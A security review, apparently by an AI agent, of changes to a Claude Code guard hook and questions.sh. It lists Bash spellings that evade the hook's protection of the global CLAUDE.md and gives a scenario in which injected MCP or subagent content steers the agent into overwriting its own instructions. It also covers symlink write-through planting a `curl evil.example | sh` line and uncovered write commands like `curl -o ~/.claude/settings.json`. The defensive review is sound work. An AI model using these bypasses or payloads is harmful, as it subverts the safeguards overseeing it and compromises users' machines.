Commit: 654c0ed

# Security Review — branch `answers-2026-09-20`

**Scope:** `git -C /workspace diff e8d5fa1..answers-2026-09-20`. Priority files: `hooks/guard-trusted-writes.py`, `scripts/questions.sh`, `scripts/self-improvement.sh`, `scripts/archive-working-docs.sh`.
**Date:** 2026-09-21
**Based on:** `docs/reviews/code-fact-check-report.md` (merged k=3, Commit 654c0ed). Its Claims 1, 3, 5, 10, 11 and 13 are used as the behavioural foundation and are not re-verified here.
**Probes:** `/tmp/claude-1000/-workspace/104b63ce-e414-465c-a24f-dda1e4116218/scratchpad/sec/` contains `probe_guard.py`/`.out`, `probe_q.sh`/`.out` and `probe_q2.sh`/`.out`. These compare the old (e8d5fa1) and new (654c0ed) guard and `questions.sh` extracted with `git show`. They ran hermetically. The victim files are scratchpad files, not real dotfiles.

## Trust Boundary Map

```
B1: [model-emitted Bash command text]     → [guard bash_targets(): WRITE_PRIMITIVE + HARD_FRAG/SOFT_FRAG] → [global policy files: ~/.claude/CLAUDE.md, ~/CLAUDE.md, ~/.claude/settings*.json, ~/.claude/hooks/**, global-instructions/CLAUDE.md] (moved: CLAUDE.md tier narrowed)
B2: [model-emitted Edit/Write file_path]  → [guard classify_path() + permissions.deny]                   → [same global policy files; project .claude/] (moved: project .claude/ HARD→SOFT)
B3: [session taint marker /tmp/cc-web-taint/<sid>] → [guard `tainted` flag]                              → [SOFT-tier ask vs silent defer]
B4: [contents + symlinks of the caller's repo docs/working/] → [questions.sh (installed, run from $PWD)] → [arbitrary user-writable file via write-through] (new: previously resolved only to claude-workflows itself)
B5: [SI_RUN_ID env / docs/working/si-run-id.txt] → [regex ^[A-Za-z0-9._-]+$ on write and on read]      → [archive file names, hypothesis-log cells] (new)
```

| Label | Source | Mutability | Trust per sink class |
|---|---|---|---|
| S1 | Bash `command` text from the model | request-time | UNTRUSTED for every write sink. A model steered by injected content (web, MCP tools, repo files, subagent output) authors it. |
| S2 | Edit/Write/MultiEdit `file_path` from the model | request-time | UNTRUSTED for path-construction and write sinks |
| S3 | Taint marker file | runtime-mutable | Trusted only as a "this session saw web content" signal. It is **not** evidence of cleanliness: it covers WebSearch/WebFetch only and does not propagate from subagents (`hooks/web-taint-mark.py:5`). |
| S4 | `$PWD` git toplevel | request-time (operator/agent cwd) | Trusted for choosing which project. The files and symlinks *inside* that project are S5. |
| S5 | `docs/working/*` contents and symlinks in the caller's repo | runtime-mutable, and attacker-authored in a cloned repo | UNTRUSTED for write-destination and file-content sinks |
| S6 | `SI_RUN_ID` env / `si-run-id.txt` | deploy-time env; repo-mutable file | UNTRUSTED for path construction and table cells. Regex-bounded at both ends. |
| S7 | `CLAUDE_CONFIG_DIR` / `HOME` env | deploy-time | Trusted, but it must agree with the `{{CLAUDE_DIR}}` substituted into the deny rules |

Inputs from outside the trust boundary are S1, S2 and S5. S1 and S2 are model output that injected content can steer. S5 is repo content that can come from anyone who authored a repo the user clones. The diff makes two changes here. It narrows B1, so fewer Bash spellings reach deny. It extends B4, so `questions.sh` now runs against the docs of *any* repo. Both changes assume their input is benign: text classification of S1 assumes canonical spellings, and `questions.sh` assumes S5 contains regular files.

## Findings

#### 1. Bash global-CLAUDE.md tier narrowed: ordinary and normalised spellings of the global memory files now get no hook opinion when the session is untainted

**Severity:** High
**Location:** `hooks/guard-trusted-writes.py:121-132` (decision at `:159-170`)
**Boundary:** B1, B3
**Move:** #11 (bypass enumeration), #5 (invert the access model)
**Confidence:** High on the mechanism, which was executed. Medium on real-world exploitation: it depends on the permission mode and on whether the injected content set the taint marker.
**Legibility-target:** for-author

Evidence:
```python
_GLOBAL_PREFIXES = [r"~", r"\$HOME", r"\$\{HOME\}", r"global-instructions"]
HARD_FRAG = re.compile(
    r"\.claude/hooks(/|\b)|\.claude/settings|\.claude/CLAUDE\.md|managed-settings"
    r"|(?:" + "|".join(_GLOBAL_PREFIXES) + r")/CLAUDE\.md",
    re.I)
```
```python
        if tier == "soft" and tainted:
            emit("ask", ...)
        defer()
```
(excerpt `:167-170`. The enclosing Bash branch of `main()` ends at `:170`, and the file-tool branch starts at `:172`. Both were read.)

The fact-check's Claim 3 lists quote, `//`, `/./`, `..` and `${HOME:-}` variants. The probe adds variants that target **`~/.claude/CLAUDE.md` itself**, which is the global instructions file every session loads. All of these were `deny` at e8d5fa1. Now they are `defer` when untainted and `ask` when tainted (`probe_guard.out`):

- `mv /tmp/x ~/.claude//CLAUDE.md`, `mv /tmp/x ~/.claude/./CLAUDE.md`
- `mv /tmp/x "$HOME/.claude"/CLAUDE.md`, where quoting the directory is normal shell style
- `cd ~/.claude && mv /tmp/x CLAUDE.md`. This is a sibling of the accepted `cd ~` residual, but it hits the file that is actually loaded.
- `H=~; echo x > $H/CLAUDE.md`, a variable alias
- `echo x > "$HOME"/CLAUDE.md`, `/home/node//CLAUDE.md`, `global-instructions//CLAUDE.md`, `cd global-instructions && echo x > CLAUDE.md`

Attack scenario:
1. Instructions injected through a channel that does not set taint reach the main session. Such channels include an MCP tool result (Gmail, Drive and Docs tools are connected in this session), a repo file, or a subagent's summary of a web page. Per `web-taint-mark.py:5`, taint "does NOT propagate between subagent and parent sessions".
2. The model runs `mv /tmp/payload ~/.claude//CLAUDE.md`.
3. The guard returns no opinion, and the deny rules do not cover Bash.
4. In the installed layout `~/.claude/` is node-writable and `CLAUDE.md` is only a symlink to root-owned `/opt/claude-workflows/CLAUDE.md`. `mv` renames over the symlink, so the read-only target is no protection. This is inferred from `ls -la ~/.claude` and was not executed against the real file.
5. Every later session in every project loads the attacker's global instructions.

This is persistent control of the agent, which amounts to privilege escalation. Before this diff the hook denied it outright, whatever the permission mode or auto-approve result. With the sandbox down, that deny was the only unconditional gate on this path. `"$HOME"/CLAUDE.md` and `"$HOME/.claude"/CLAUDE.md` are also spellings an honest agent writes, so the tier's legibility claim ("only when qualified as global") fails even outside the attack case.

**Recommendation:** Normalise before matching. Strip shell quotes, collapse `//` and `/./`, and treat `${HOME…}` as `$HOME`. Also match `(^|[\s"'=/])CLAUDE\.md` as HARD whenever the same command text contains `.claude` or a home token (`~`, `$HOME`, `${HOME`, the literal home). That restores deny for every global spelling while keeping bare project `CLAUDE.md` heredocs SOFT. Add the spellings above as bats cases (Claim 9 notes that none exist).

#### 2. `questions.sh` now writes through attacker-planted symlinks in any repo it is run from, giving arbitrary-file append or overwrite with attacker-authored content

**Severity:** High
**Location:** `scripts/questions.sh:55-57` (new resolution), `:275-276`, `:286-287`, `:320`, `:328`
**Boundary:** B4
**Move:** #2 (implicit sanitisation assumption), #12 (sweep of the file-write primitive), #4 (check/use in `init`)
**Confidence:** Medium. The mechanism was executed and is certain. The likelihood depends on an agent or user running `archive` or `init` inside an untrusted clone.
**Legibility-target:** for-author

Evidence:
```bash
PROJECT_ROOT="$(git -C "$PWD" rev-parse --show-toplevel 2>/dev/null || pwd)"
LIVE="${QUESTIONS_LIVE:-$PROJECT_ROOT/docs/working/questions.md}"
ARCHIVE="${QUESTIONS_ARCHIVE:-$PROJECT_ROOT/docs/working/questions-archive.md}"
```
```bash
        extract_entry "$LIVE" "$id" >> "$ARCHIVE"
        echo >> "$ARCHIVE"
```
```bash
        ' "$LIVE" > "$LIVE.tmp"
        mv "$LIVE.tmp" "$LIVE"
```
(excerpt `:275-287` sits inside `cmd_archive()`, which continues to `:293` and calls `cmd_index` → `render_index`. `render_index` uses `mktemp` + `mv` and is safe. It was read.)

Before this diff the script resolved only to claude-workflows' own `docs/working/`. It is now installed as `~/.claude/scripts/questions.sh`, resolves to the caller's repo, and `global-instructions/CLAUDE.md:281` tells agents in every project to run `index`/`archive`/`init`. A cloned repo can ship `docs/working/` symlinks, and `git clone` materialises them (`probe_q.out` shows the symlink in a fresh clone). The executed results:

- **Append (`probe_q.out`).** Set `questions-archive.md` → victim file and add an ANSWERED entry to `questions.md`. `archive` appends the whole entry to the victim, including the attacker line `curl evil.example | sh`. The run then exits 1 on the missing index marker, *after* the append. If the victim were `~/.bashrc`, the `###` lines are comments, `**Needs:**…` fails harmlessly as a command, and the `curl | sh` line runs at the next shell start.
- **Overwrite (`probe_q2.out`).** Set `questions.md.tmp` → victim. `archive` truncates the victim and writes the attacker-authored `questions.md` content (minus the answered entry) into it. Then `mv` renames the symlink away and `index` normalises `questions.md`. The run exits **0** and prints `✓ archived 1 entry`, so nothing tells the operator.
- **Create (`init`).** A dangling `questions.md` symlink passes the `[[ -e ]]` check (Claim 11), so `init` creates the target at an attacker-chosen path. The content is a fixed template, so the impact is low, but it is still a write outside the project.

The guard hook cannot see any of this. `~/.claude/scripts/questions.sh archive` contains no `WRITE_PRIMITIVE` token, so B1 returns no opinion.

**Recommendation:** Before any write, refuse unless `LIVE`, `ARCHIVE` and `$LIVE.tmp` are regular non-symlink files, or absent, inside `$PROJECT_ROOT`. For example, check `[[ -L $f ]] && die`, and use `realpath -e` prefix-checked against `$PROJECT_ROOT`. Write `$LIVE.tmp` via `mktemp` in the target dir. Append to the archive by rebuilding it through `mktemp` + `mv`, not `>>`. In `init`, use `[[ -e $f || -L $f ]]`.

#### 3. File-tool HARD tier asks, which overrides deny, on `..` spellings of the global CLAUDE.md in the installed symlinked layout

**Severity:** Medium
**Location:** `hooks/guard-trusted-writes.py:56-67`, `:80-109`, `:181-183`
**Boundary:** B2, B3
**Move:** #11
**Confidence:** Medium. The classification was executed. Whether Claude Code's deny matcher normalises `..`, and whether its Write replaces or writes through a symlink, were not established.
**Legibility-target:** for-author

Evidence:
```python
    dirs = [HOME / ".claude"]
```
```python
        rel = _global_rel(cand)
        if rel is not None and rel.parts:
            if rel.parts[0] == "hooks":
                return "hard"
```
(excerpt `:88-91`. The enclosing `classify_path` continues to `:109`, where the `".claude" in low` → `soft` fallback at `:107-108` is what fires. It was read.)

This is fact-check Claim 1, re-rated for exploitability. `~/.claude/x/../CLAUDE.md` gave `defer` at e8d5fa1 and gives `ask` (tainted) at 654c0ed; MultiEdit and the `path` key behave the same (`probe_guard.out`). The mechanism has two parts. `resolve()` follows `~/.claude/CLAUDE.md` into `/opt/claude-workflows/`, which is not in `GLOBAL_DIRS`. The unresolved `..` form fails `relative_to`. If Claude Code normalises the path for `Edit(/home/node/.claude/CLAUDE.md)`, the hook's ask overrides that deny (#39344), which is exactly the case the docstring forbids. That turns a hard block into a human prompt, but only in tainted sessions. The `hooks/**` variant is pre-existing, and the root-owned 0555 `/opt/claude-workflows/hooks` blocks it at the filesystem level in this layout. The CLAUDE.md variant is new. Its filesystem protection holds only if Write writes through the symlink rather than renaming over it, and that was not established.

**Recommendation:** Before the tier checks, lexically normalise with `os.path.normpath` on the expanded path. Add the resolved targets of the global HARD entries (`(g/"hooks").resolve()`, `(g/"CLAUDE.md").resolve()`, `settings*.json`) to the comparison set, so a resolved candidate that lands on a link target still classifies HARD.

#### 4. Bash guard has no coverage for several common write primitives (pre-existing, unchanged by the diff)

**Severity:** Medium
**Location:** `hooks/guard-trusted-writes.py:112-120`
**Boundary:** B1
**Move:** #11, #12
**Confidence:** High (executed)
**Legibility-target:** for-author

Evidence:
```python
WRITE_PRIMITIVE = re.compile(
    r">>?(?!&\s*(?:\d|-)|\s*/dev/null\b)"
    r"|\btee\b|\bsed\b[^\n|;&]*\s-\w*i\w*\b"       # tee, sed -i
    r"|\bdd\b[^\n]*\bof=|\btruncate\b"             # dd of=, truncate
    r"|\b(cp|mv|install|rsync)\b"                  # copy/move/install (dest ambiguous)
    r"|\b(python[0-9.]*|node|perl|ruby)\b[^\n]*\s-[ce]\b"  # inline interpreters
)
```

The following all return `defer` on both versions, so this is not a regression. Each can plant hooks in `~/.claude/settings.json`, which means code execution in later sessions.
- `ln -sf /tmp/evil.json ~/.claude/settings.json`
- `curl -o ~/.claude/settings.json …`
- `wget -O ~/CLAUDE.md …`
- `tar -xf … -C ~/.claude`
- `unzip -o … -d ~/.claude/hooks`
- `… | sponge ~/.claude/settings.json`
- `python3 /tmp/w.py ~/.claude/settings.json`, a script-file interpreter with no `-c`
- `git -C ~ checkout -- CLAUDE.md`
- `git config --global core.hooksPath /tmp/h`, which is a different policy surface

The docstring's contract for Bash is that it "returns 'deny' outright" for the path deny rules don't cover. The accepted-risk note in `auto-approve-allowed-commands.sh` says "permissions.deny plus the sandbox are the boundary", but deny rules do not cover Bash, and the sandbox is documented as down. This finding is listed here because the diff re-touches this guard and the brief asked for primitive coverage.

**Recommendation:** Add `ln`, `curl\s[^\n]*-o|--output`, `wget\s[^\n]*-O`, `tar\s[^\n]*-[^\s]*x`, `unzip`, `sponge`, `git\s+(checkout|restore|apply|config)`, and bare `python|node|perl|ruby <script>`. Alternatively, invert the rule so any command whose text names a HARD fragment is denied unless it matches a read-only allowlist (`cat`, `grep`, `git diff`, …). That is the approach that converges.

#### 5. `CLAUDE_CONFIG_DIR` tiering disagrees with the deny-rule substitution

**Severity:** Informational
**Location:** `hooks/guard-trusted-writes.py:56-67`
**Boundary:** B2 (S7)
**Move:** #5
**Confidence:** High (fact-check Claim 5, executed)
**Legibility-target:** for-author

Evidence:
```python
    dirs = [HOME / ".claude"]
    cfg = os.environ.get("CLAUDE_CONFIG_DIR")
    if cfg:
        dirs.append(Path(os.path.expanduser(cfg)))
```

With `CLAUDE_CONFIG_DIR=/cfg`, `~/.claude/settings.json` and `~/.claude/hooks/x.py` classify HARD and defer. The deny rules name only `/cfg`, so no gate applies. This is rated Informational rather than Medium because, with the variable pointing elsewhere, Claude Code does not load `~/.claude` config, so writing there violates no loaded policy. In this container `CLAUDE_CONFIG_DIR=/home/node/.claude`, so the two agree. A relative `CLAUDE_CONFIG_DIR` (`cfg`) is left unresolved and matches `cfg/settings.json` from any cwd. That is a misconfiguration, not an attack.

**Recommendation:** When `CLAUDE_CONFIG_DIR` is set, drop `HOME/.claude` from `GLOBAL_DIRS`, or classify it SOFT so it keeps a gate. Resolve a relative value, or reject it.

#### 6. Taint derivation does not cover MCP tools or subagent-relayed content, which widens the reach of every SOFT-tier reclassification (pre-existing)

**Severity:** Informational
**Location:** `hooks/web-taint-mark.py:1-5` (unchanged); consumed at `hooks/guard-trusted-writes.py:156-157`
**Boundary:** B3
**Move:** #1
**Confidence:** High (read-static)
**Legibility-target:** for-orchestrator-synthesis

Evidence:
```
NOTE: taint covers WebSearch|WebFetch only — add MCP web tool names to the matcher.
Taint does NOT propagate between subagent and parent sessions.
```

Every HARD→SOFT move in this diff (Findings 1 and 3, project `.claude/`) swaps an unconditional block for "ask only if `tainted`". `tainted` stays false for Gmail, Drive and Docs MCP output (all connected in this session) and for anything a subagent read, so for those channels SOFT means no gate at all. This finding carries no separate severity. It is the reason Finding 1 is rated High rather than Medium.

## Untested bypass candidates

- **Claude Code deny-matcher normalisation of `..`, `//` and symlink targets.** Not tested: it needs the Claude Code binary's permission engine, which cannot be run hermetically here. It decides whether Finding 3 is deny→ask or no-change.
- **Claude Code Write: write-through vs atomic rename over a symlinked `~/.claude/CLAUDE.md`.** Not tested, for the same reason. It decides whether the filesystem read-only target protects the file-tool path.
- **Real `mv` over `~/.claude/CLAUDE.md`.** Not executed because it is destructive to the live config. The mechanism is inferred from directory permissions (`drwxr-xr-x node ~/.claude`).
- **Unicode and case-folded spellings in Bash (`CLAUDE.MD`, fullwidth slash).** `re.I` covers ASCII case, and Linux paths are case-sensitive, so a case variant names a different, unloaded file. Unicode was not probed.
- **Project `.claude` symlinked to `~/.claude` and written via Write with a non-`..` path.** Fact-check r3 covered this in a fakehome. The installed-layout symlinked-hooks variant is FS-blocked (0555 root). No further test was run.

## Endorsement Claims

- **Claim:** `SI_RUN_ID` is rejected unless it matches `^[A-Za-z0-9._-]+$` before it is written to `si-run-id.txt`, and `archive-working-docs.sh` re-applies the same regex to the file's first line before using it as `PREFIX`. Neither side admits `/`, so the destination `"$ARCHIVE_DIR/${PREFIX}-${name}"` stays a single path component under `archive/`.
  **Location:** `scripts/self-improvement.sh:458-463`; `scripts/archive-working-docs.sh:43-49`, `:127`
  **Evidence:** read-static
  **Verified:** both regex checks and the `dest=` construction, read in full; fact-check Claim 13 (executed) for `.`, `..` and `-rf` inputs.
  **Not verified:** the `hypothesis-log.md` Run-cell writer path through `append_approved_hypotheses` (`si-functions.sh:487-538`) with a run id containing `|`, which the regex excludes but no test exercises.
  **route: code-fact-check**
- **Claim:** For the file tools, a project's `.claude/settings.json` and `.claude/hooks/*` now yield `ask` in a tainted session, where e8d5fa1 deferred with no applicable deny rule. That is strictly more gate on B2 for project paths.
  **Location:** `hooks/guard-trusted-writes.py:100-109`
  **Evidence:** executed (`probe_guard.out` rows `/workspace/.claude/settings.json`, `/workspace/.claude/hooks/x.sh`)
  **Verified:** old vs new decisions for those two paths, tainted and untainted.
  **Not verified:** untainted sessions, which still get no hook opinion (unchanged); project `settings.local.json` and nested hook paths.
  **route: code-fact-check**

(`hooks/guard-trusted-writes.py` as a whole appears in no endorsement: it has open findings and untested bypass candidates, per move #11.)

## Primitive sweep

Primitive: shell file-write (`>`, `>>`, `mv`) on paths derived from repo content, in changed scripts

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `scripts/questions.sh:275-276` (`>> "$ARCHIVE"`) | S4+S5 | none (symlink followed) | Finding 2 |
| `scripts/questions.sh:286` (`> "$LIVE.tmp"`) | S4+S5 | none (symlink followed) | Finding 2 |
| `scripts/questions.sh:287` (`mv "$LIVE.tmp" "$LIVE"`) | S4+S5 | replaces the link, not the target | cleared: rename does not write through |
| `scripts/questions.sh:257` (`mv "$tmp.out" "$file"`) | S4+S5 | `mktemp` source | cleared: rename replaces the link |
| `scripts/questions.sh:328` (`> "$file"` in `init`) | S4+S5 | `[[ -e ]]` (misses dangling links) | Finding 2 (create sub-case) |
| `scripts/self-improvement.sh:463` (`> si-run-id.txt`) | S6 | regex | cleared: fixed path under `$WORKING_DIR` in the SI repo, and the value is regex-bounded |
| `scripts/archive-working-docs.sh:135` (`mv -- "$f" "$dest"`) | S6, S5 | regex on PREFIX; `[ -f ]` on `$f` | cleared: PREFIX has no `/`; `-f` follows links, so a symlinked working file is moved as a link, not written through |

Primitive: text-classified Bash write detection (guard)

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `hooks/guard-trusted-writes.py:134-142` `bash_targets` | S1 | `WRITE_PRIMITIVE`, `HARD_FRAG`, `SOFT_FRAG` | Findings 1 and 4 |
| `hooks/guard-trusted-writes.py:80-109` `classify_path` | S2 | `resolve()` + `GLOBAL_DIRS` | Findings 3 and 5 |

`scripts/lite-review.py`, `scripts/health-check.sh`, `scripts/lib/si-morning-summary.sh` and the `devcontainer-config/*.sh` changes were read at the diff level only. None adds a new write primitive fed by S1, S2 or S5. The fact-check covers their behaviour (Claims 12, 16, 17 and 24).

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | Bash global-CLAUDE.md tier narrowed; `~/.claude//CLAUDE.md`, `"$HOME"/…`, `$H` alias, `cd ~/.claude &&` now ungated when untainted | High | B1, B3 | `hooks/guard-trusted-writes.py:121-132` | High (mechanism) / Medium (exploit) |
| 2 | `questions.sh` writes through planted symlinks in any repo (append / overwrite / create) | High | B4 | `scripts/questions.sh:55-57,275-287,320-328` | Medium |
| 3 | File-tool ask (overrides deny) on `~/.claude/x/../CLAUDE.md` in the symlinked layout | Medium | B2, B3 | `hooks/guard-trusted-writes.py:56-109` | Medium |
| 4 | Missing Bash write primitives (`ln`, `curl -o`, `wget -O`, `tar -C`, `unzip`, `sponge`, `git checkout`), pre-existing | Medium | B1 | `hooks/guard-trusted-writes.py:112-120` | High |
| 5 | `CLAUDE_CONFIG_DIR` tier / deny-rule mismatch | Informational | B2 | `hooks/guard-trusted-writes.py:56-67` | High |
| 6 | Taint misses MCP and subagent channels, amplifying SOFT moves | Informational | B3 | `hooks/web-taint-mark.py:1-5` | High |

## Overall Assessment

No HALT pattern matched. The changes are fixable in place and do not point to an architectural problem.

The main risk is the combination of Finding 1 and Finding 6. The Q-035 narrowing was meant to stop false denials on bare project `CLAUDE.md` heredocs. It also drops the unconditional deny on the global memory file for many spellings: the double slash, the dot segment, a quoted `"$HOME"`, a `$H` alias, and `cd ~/.claude &&`. In untainted sessions (which includes MCP- and subagent-relayed injection) that leaves no hook gate at all, and `mv` over the writable `~/.claude/CLAUDE.md` symlink persists attacker instructions into every later session.

Finding 2 is the only issue that is both new in this diff and confirmed end-to-end by execution. Re-pointing `questions.sh` at `$PWD` turned a single-repo tool into one that writes through untrusted repos' symlinks, and the overwrite variant exits 0 silently.

The most important single fix is to restore deny for global CLAUDE.md spellings by normalising the command text before matching (Finding 1), then add a symlink refusal to `questions.sh` (Finding 2). Endorsement claims are pending execution verification. The guard hook has no endorsement.

## Goal-Alignment Note

- **Answered:** security design review of the full range. The brief's requested focus areas (tier-logic bypasses, quoting/normalisation variants, `CLAUDE_CONFIG_DIR`, symlinks, case, tool names, `questions.sh` `$PWD` resolution, `SI_RUN_ID` writer/reader) each have a finding, an endorsement, or an untested-candidate entry. Fact-check Claims 1, 3 and 5 were re-rated for exploitability: Findings 3, 1 and 5 respectively. New bypasses beyond the fact-check are the `~/.claude//CLAUDE.md` / `mv` / `$H` / `cd ~/.claude` variants (F1), the symlink write-through in `questions.sh` (F2) and the missing primitives (F4).
- **Out of scope:** the accepted `cd ~ && echo > CLAUDE.md` residual, which was excluded by the brief and not re-reported. I did note that its `cd ~/.claude` sibling targets the loaded file. Doc-only skill/workflow edits were not security-reviewed. Claude Code's internal deny-matcher and Write semantics could not be run here.
- **Escalate:** whether the user considers `cd ~/.claude && mv … CLAUDE.md` covered by the accepted `cd ~` residual (you: judgment). The two untested Claude Code behaviours need a host check to settle Finding 3's severity (you: terminal). Probe artifacts live only in the session scratchpad. The orchestrator may want to copy them under `docs/reviews/execution-logs/`, which I did not do because the brief forbids modifying other repo files.
